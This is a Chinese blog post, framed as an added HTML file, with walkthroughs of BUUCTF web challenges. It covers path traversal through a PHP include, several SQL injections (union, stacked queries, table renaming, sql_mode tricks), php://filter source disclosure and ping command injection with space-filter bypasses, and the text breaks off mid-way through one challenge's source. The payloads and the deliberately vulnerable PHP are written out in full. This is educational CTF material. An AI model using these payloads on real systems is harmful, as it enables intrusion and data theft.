@@ -1,0 +1,456 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="[HCTF 2018]WarmUp查看源码，发现，访问，代码审计 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php    highlight_file(__FILE__);    class emmm    &amp;#123;        public st">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTFWeb1">
+<meta property="og:url" content="http://example.com/2021/05/06/BUUCTFWeb1/index.html">
+<meta property="og:site_name" content="BkingXD">
+<meta property="og:description" content="[HCTF 2018]WarmUp查看源码，发现，访问，代码审计 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php    highlight_file(__FILE__);    class emmm    &amp;#123;        public st">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-05-06T13:00:26.000Z">
+<meta property="article:modified_time" content="2021-05-06T13:02:16.512Z">
+<meta property="article:author" content="BkingXD">
+<meta property="article:tag" content="CTF-web">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2021/05/06/BUUCTFWeb1/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>BUUCTFWeb1 | BkingXD</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">BkingXD</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/06/BUUCTFWeb1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="BkingXD">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BkingXD">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          BUUCTFWeb1
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-05-06 21:00:26 / 修改时间：21:02:16" itemprop="dateCreated datePublished" datetime="2021-05-06T21:00:26+08:00">2021-05-06</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h1><p>查看源码，发现<!--source.php-->，访问，代码审计</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];<span class="comment">//白名单，不过滤</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="comment">//匹配传入的参数中是否含有白名单，这里要存在白名单</span></span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)<span class="comment">//返回&#x27;?&#x27;在$page.&#x27;?&#x27;第一次出现的位置</span></span><br><span class="line">            );<span class="comment">//截取$page从0到第一个&#x27;?&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="comment">//$_page中要有白名单</span></span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);<span class="comment">//进行url解码</span></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])<span class="comment">//传参file，且参数要为字符串</span></span><br><span class="line">        &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>输入<code>payload：?file=hint.php</code>，得到<code>flag not here, and flag in ffffllllaaaagggg</code>，因为我们并不知道<code>ffffllllaaaagggg</code>位于哪个目录下面，所以依次尝试增加<code>../</code>，最终构造的<code>payload：?file=hint.php?../../../../../ffffllllaaaagggg</code>，这里也可以把<code>hint.php</code>换成<code>source.php</code></p>
+<h1 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h1><p>输入<code>username=123 &amp;password=123</code>，回显为<code>NO,Wrong username password！！！</code></p>
+<p>输入<code>username=123&#39; &amp;password=123</code>，出现语法报错，说明存在注入</p>
+<p>继续输入,闭合单引号，构造永真的语句，<code>username=123&#39; or 1=1# &amp;password=123</code>，成功拿到flag</p>
+<h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><p><code>1&#39;</code>SQL语句报错，<code>1&#39;#</code>正常回显，然后查询字段数，<code>1&#39; order by 4#</code>，SQL语句报错，只有3个字段，尝试联合注入<code>1&#39; union select 1,2,database()#</code>，回显如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match(&quot;&#x2F;select|update|delete|drop|insert|where|\.&#x2F;i&quot;,$inject);&#x2F;&#x2F;过滤掉的语句</span><br></pre></td></tr></table></figure>
+
+<p>看到<code>select</code>被过滤了，想到应该用堆叠注入绕过</p>
+<p>查询库名，<code>0&#39;;show databases;#</code>，得到数据库有</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">string(11) &quot;ctftraining&quot;</span><br><span class="line">string(18) &quot;information_schema&quot;</span><br><span class="line">string(5) &quot;mysql&quot;</span><br><span class="line">string(18) &quot;performance_schema&quot;</span><br><span class="line">string(9) &quot;supersqli&quot;</span><br><span class="line">string(4) &quot;test&quot;</span><br></pre></td></tr></table></figure>
+
+<p>查询表名，<code>0&#39;;show tables;#</code>，得到该数据库下的表名有</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string(16) &quot;1919810931114514&quot;</span><br><span class="line">string(5) &quot;words&quot;</span><br></pre></td></tr></table></figure>
+
+<p>分别查看两张表里面的内容，这里用<code>desc</code>降序获取数据表的结构，如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">0&#39;;desc words;#                              0&#39;;desc &#96;1919810931114514&#96;;# </span><br><span class="line">array(6) &#123;                                   array(6) &#123;</span><br><span class="line">  [0]&#x3D;&gt;                                        [0]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;id&quot;                               string(4) &quot;flag&quot;</span><br><span class="line">  [1]&#x3D;&gt;                                        [1]&#x3D;&gt;</span><br><span class="line">  string(7) &quot;int(10)&quot;                          string(12) &quot;varchar(100)&quot;</span><br><span class="line">  [2]&#x3D;&gt;                                        [2]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;NO&quot;                               string(2) &quot;NO&quot;</span><br><span class="line">  [3]&#x3D;&gt;                                        [3]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;                                 string(0) &quot;&quot;</span><br><span class="line">  [4]&#x3D;&gt;                                        [4]&#x3D;&gt;</span><br><span class="line">  NULL                                         NULL</span><br><span class="line">  [5]&#x3D;&gt;                                        [5]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;                                 string(0) &quot;&quot;</span><br><span class="line">&#125;                                            &#125;</span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;data&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  string(11) &quot;varchar(20)&quot;</span><br><span class="line">  [2]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]&#x3D;&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里在查询<code>1919810931114514</code>数据表时加了反引号，是因为在windows系统下，反引号（`）是数据库、表、索引、列和别名用的引用符。</p>
+<p>到这一步，我们可以得知，我们输入<code>1</code>，回显的应该是当前数据库下<code>words</code>这张表中的数据，所以这里的后端查询代码应该是<code>select id,data from words where id=</code>，而flag则在<code>1919810931114514</code>这张表中，这里可以用重命名换表输出，最后输入永真句<code>0&#39; or 1=1#</code>，就能得到flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#39;;rename table words to word;rename table &#96;1919810931114514&#96; to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc  words;#</span><br></pre></td></tr></table></figure>
+
+<p>看了别的师傅的WP，发现这里还可以用预处理语句，但不是很懂，涨了点知识，再学吧</p>
+<h1 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h1><p>查看源码，发现以下代码，<code>payload：url/?cat=dog</code>，回显flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">        $cat&#x3D;$_GET[&#39;cat&#39;];</span><br><span class="line">        echo $cat;</span><br><span class="line">        if($cat&#x3D;&#x3D;&#39;dog&#39;)&#123;</span><br><span class="line">            echo &#39;Syc&#123;cat_cat_cat_cat&#125;&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">        --&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h1><p><code>1</code>，有回显，<code>1&#39;</code>无回显，再闭合单引号，发现还是没有回显，应该字符型注入，用字典跑了一遍，发现过滤了<code>and,or,union</code>等语句，那就尝试了一下堆叠注入，于是得到如下结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1;show databases;</span><br><span class="line">Array ( [0] &#x3D;&gt; 1 ) Array ( [0] &#x3D;&gt; ctf ) Array ( [0] &#x3D;&gt; ctftraining ) Array ( [0] &#x3D;&gt; information_schema ) Array ( [0] &#x3D;&gt; mysql ) Array ( [0] &#x3D;&gt; performance_schema ) Array ( [0] &#x3D;&gt; test )</span><br><span class="line">1;show tables;</span><br><span class="line">Array ( [0] &#x3D;&gt; 1 ) Array ( [0] &#x3D;&gt; Flag )</span><br></pre></td></tr></table></figure>
+
+<p>再尝试<code>1;desc Flag</code>时，发现不能查询到，显然是过滤了<code>flag</code>，这实在没什么思路了，学习别人的WP。</p>
+<p>后端代码如下，其实这里输入<code>1,2,3...</code>的回显一样，但<code>0</code>不一样，应该是想暗示我们后端代码用了<code>||</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select $post[&#39;query&#39;]||flag from Flag</span><br></pre></td></tr></table></figure>
+
+<p>所以这里的目的是要能执行<code>||</code>后面的语句，最终<code>payload：1;set sql_mode=PIPES_AS_CONCAT;select 1</code></p>
+<p>这里<code>PIPES_AS_CONCAT</code>，将<code>||</code>视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数<code>concat</code>相类似</p>
+<h1 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h1><p>点击“tips”，跳转至<code>http://7fcf6d87-1365-4b78-bba9-5bf97d11ffd1.node3.buuoj.cn/?file=flag.php</code>，回显为“Can you find out the flag?”，因为题目名称为“Include”，推测为文件包含，用<code>php://协议</code>读取文件，构造<code>payload：?file=php://filter/read=convert.base64-encode/resource=flag.php</code>，得到base64编码的字符串，解码得到flag</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Can you find out the flag?&quot;</span>;</span><br><span class="line"><span class="comment">//flag&#123;b2c49a7e-a49e-4299-b9d1-c045d1b193c6&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h1><p>题目为“Secret File”，网页上回显得内容为“你想知道蒋璐源的秘密么？想要的话可以给你，去找吧！把一切都放在那里了！”，说明要找到一个秘密文件。</p>
+<p>查看源码，发现一个链接<code>./Archive_room.php</code>，后面还有“Oh！You found me”，说明这就是我们要找的文件。</p>
+<p>访问链接，看到“SECRET”的点击事件，点击跳转，回显为“查阅结束，没看清么？回去再仔细看看吧。”，显然这里存在一个重定向，用BP抓包，提示<code>secr3t.php</code>，访问该文件，得到php代码并进行代码审计</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr(<span class="variable">$file</span>,<span class="string">&quot;../&quot;</span>)||stristr(<span class="variable">$file</span>, <span class="string">&quot;tp&quot;</span>)||stristr(<span class="variable">$file</span>,<span class="string">&quot;input&quot;</span>)||stristr(<span class="variable">$file</span>,<span class="string">&quot;data&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Oh no!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="comment">//对$file进行了过滤，不存在&quot;../&quot;，&quot;tp&quot;，&quot;input&quot;，&quot;data&quot;</span></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>直接访问文件，没有回显flag，然后伪协议构造<code>payload：secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php</code>，base64解码得到的字符串，在其中拿到flag</p>
+<h1 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h1><p>老规矩，尝试<code>username=1&#39; &amp;password=1</code>，回显为SQL语句报错，存在注入，输入<code>username=1&#39; or 1=1# &amp;password=1</code>，成功登入，得到<code>admin</code>的账号密码。然后尝试用<code>order by</code>爆一下字段数，但输入<code>username=1&#39; order by 1# &amp;password=1</code>时，回显为未输入账号密码，后来去查了才知道，因为之前在页面上输入是<code>$_GET</code>获取的数据，会进行url编码，后来我是在url里直接输入，导致出错。</p>
+<p>改正错误后，发现用<code>1</code>作为账号不行(应该不存在1这个账号)，于是用admin登录，<code>username=admin&#39; order by 4%23</code>时，SQL语句报错，说明只有3个字段。</p>
+<p>然后联合注入，爆数据库<code>username=1&#39; union select 1,2,database()%23</code>，库名为“geek”这里用<code>1</code>是因为要让前面的查询不存在，使回显为我们控制的语句。</p>
+<p>爆表名，表名为“geekuser,l0ve1ysq1”</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()%23</span><br></pre></td></tr></table></figure>
+
+<p>爆列名，列名为“id,username,password”</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;database()%23</span><br></pre></td></tr></table></figure>
+
+<p>最后在<code>l0ve1ysq1</code>这张表<code>password</code>这一列中找到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;1&#39; union select 1,2,group_concat(password) from l0ve1ysq1%23</span><br></pre></td></tr></table></figure>
+
+<h1 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h1><p>是一个命令执行的环境，需要我们Ping命令再拼接其它命令，考察多命令执行，</p>
+<p>于是<code>123;ls</code>，只发现一个<code>index.php</code>，想要的文件不在本层目录下，于是逐层向上寻找，发现<code>123;ls ../../../</code>已是根目录，根目录下存在<code>flag</code>文件，最终<code>paylaod：123;cat ../../../flag</code></p>
+<h1 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h1><p>页面显示为<code>/?ip=</code>，尝试<code>url/?ip=123</code>，回显为<code>PING 123 (0.0.0.123): 56 data bytes</code>，联系题目名称，这是shell中Ping命令的执行返回结果，所以想到执行多条命令，</p>
+<p><code>url/?ip=123;ls</code>，发现存在<code>flag.php</code>，于是输入<code>url/?ip=123;cat flag.php</code>，回显为”fxck your space!“，过滤了空格，尝试用<code>cat&lt;flag.php</code>绕过空格，回显”1fxck your symbol!“，说明不能有符号字符，尝试<code>cat$IFSflag.php</code>，回显”fxck your flag!“，说明不能有<code>flag</code>这个词，输入<code>cat$IFS$1index.php</code>得到<code>index.php</code>源码，知道过滤了哪些东西，这里我用内联执行得到flag，需要查看源码，因为被注释，不显示在网页上</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>))&#123;<span class="comment">//以上有一部分没有回显在网页上，查看源码可以看到</span></span><br><span class="line">    <span class="keyword">echo</span> preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your symbol!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>))&#123;<span class="comment">//过滤了空格</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/bash/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))&#123;<span class="comment">//过滤了flag字符串</span></span><br><span class="line">    